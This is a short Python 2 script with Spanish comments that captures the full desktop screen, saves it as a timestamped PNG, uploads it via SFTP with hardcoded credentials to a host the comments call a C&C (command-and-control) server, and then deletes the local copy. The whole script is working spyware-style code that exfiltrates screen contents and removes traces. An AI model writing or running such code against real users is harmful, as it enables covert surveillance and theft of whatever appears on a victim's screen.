import gtk.gdk
import paramiko
import datetime
import os, errno

#En el server C&C se realiza lo mismo que en siguiente link:
#https://devtidbits.com/2011/06/29/implement-a-sftp-service-for-ubuntudebian-with-a-chrooted-isolated-file-directory/



#En el cliente se instala pip y el modulo de paramiko para ello hacer lo sig:
#Instalar install python-dev build-essential libcanberra-gtk3-module  -y 
#Bajar el script get-pip.py  del sitio: https://pip.pypa.io/en/stable/installing/
#Ejecutar ese script con python
#pip install pycrypto
#pip install paramiko


#Imprimiendo pantalla

w = gtk.gdk.get_default_root_window()
sz = w.get_size()
pb = gtk.gdk.Pixbuf(gtk.gdk.COLORSPACE_RGB,False,8,sz[0],sz[1])
pb = pb.get_from_drawable(w,w.get_colormap(),0,0,0,0,sz[0],sz[1])
nomArchivo = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
nomArchivo = nomArchivo+".png"
if (pb != None):
    pb.save(nomArchivo,"png")





#Subiendo la captura al servidor C&C usando sftp

paramiko.util.log_to_file('/tmp/paramiko.log')


# Open a transport

host = "192.168.235.150"
port = 22
transport = paramiko.Transport((host, port))

# Auth

username = "emodulo"
password = "hola123,"
transport.connect(username = username, password = password)

# Go!

sftp = paramiko.SFTPClient.from_transport(transport)

#Ruta en el servidor, se requieren de permisos
filepath = '/var/www/test_readwrite/'+nomArchivo

#Ruta del archivo que se va a subir
localpath = '/home/diego/'+nomArchivo
sftp.put(localpath, filepath)

try:
    os.remove(nomArchivo)
except OSError:
    pass
